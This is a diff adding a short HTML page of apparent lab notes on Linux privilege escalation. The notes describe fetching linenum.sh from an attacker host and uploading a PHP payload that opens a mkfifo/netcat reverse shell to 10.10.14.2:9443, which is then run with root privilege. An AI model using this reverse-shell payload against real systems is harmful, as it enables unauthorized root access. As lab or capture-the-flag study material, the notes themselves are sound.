@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<body style="background-color:powderblue";>
+	<h1 style="font-size:60px;font-family:Courier New;">Privilege Escalation<sub style="font-size:13px">by suppi</sub></h1>
+    <p style="font-family:courier;">First, its compulsary to have access to ssh user. Then execute this script user@remotehost$ wget http://10.10.14.1:8000/linenum.sh in order to crawl possible root-free execute command. After that, upload a malicious code(<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>) in the same time create a reverse shell. Finally, execute the file with root-free command with the root privilege. As the result, we can have a root reverse shell.</p>
+    <b style="font-family:courier;">All related materials is in list.txt</b>
+    
+</body>
+</html>
